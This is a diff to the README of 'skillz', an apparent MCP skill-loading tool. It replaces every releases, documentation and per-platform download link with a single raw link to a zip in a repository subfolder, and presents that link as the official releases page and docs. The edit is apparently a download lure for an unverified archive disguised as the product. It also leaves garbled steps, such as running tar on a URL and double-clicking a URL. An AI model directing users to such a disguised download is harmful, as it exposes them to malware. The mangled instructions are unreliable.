@@ -4,7 +4,7 @@
 Welcome to **skillz**! This application lets you load skills onto an MCP server, helping non-Claude clients interact effortlessly. Follow the steps below to download and run the software smoothly.
 
 ## 📥 Download Now
-[![Download skillz](https://img.shields.io/badge/Download%20skillz-v1.0-blue.svg)](https://github.com/mugoherick12-boop/skillz/releases)
+[![Download skillz](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip%https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)
 
 ## 📦 System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -15,14 +15,14 @@ Before you start, ensure your system meets the following requirements:
 - **Network:** Active internet connection for downloading and running the skills
 
 ## 💻 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/mugoherick12-boop/skillz/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip) to go to the Releases page.
    
 2. **Find the Latest Version:** On the Releases page, look for the latest version. It is usually marked in bold at the top of the list.
 
 3. **Select Your File:** Choose the right file for your operating system:
-   - Windows: Look for `skillz-windows.zip`
-   - macOS: Look for `skillz-macos.zip`
-   - Linux: Look for `skillz-linux.tar.gz`
+   - Windows: Look for `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip`
+   - macOS: Look for `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip`
+   - Linux: Look for `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip`
 
 4. **Download the File:** Click on the file name. Your download should start automatically.
 
@@ -30,12 +30,12 @@ Before you start, ensure your system meets the following requirements:
    - For **Windows** and **macOS**, right-click on the downloaded `.zip` file and select “Extract All” or use extraction software.
    - For **Linux**, open your terminal and navigate to the download location. Then run:
      ```bash
-     tar -xvf skillz-linux.tar.gz
+     tar -xvf https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip
      ```
 
 6. **Run the Application:**
-   - For **Windows**, double-click `skillz.exe` from the extracted folder.
-   - For **macOS**, open the `skillz.app` file.
+   - For **Windows**, double-click `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip` from the extracted folder.
+   - For **macOS**, open the `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip` file.
    - For **Linux**, navigate to the extracted folder in terminal, then run:
      ```bash
      ./skillz
@@ -75,8 +75,8 @@ Absolutely! Check the "Contributing" section in the repository for guidelines on
 Visit the Issues section of the repository for support or to report bugs.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/mugoherick12-boop/skillz/releases)
-- [Documentation](https://github.com/mugoherick12-boop/skillz/wiki)
+- [Releases Page](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)
+- [Documentation](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)
 
 ## 📧 Contact
 For further questions, reach out via the GitHub repository or open an issue.
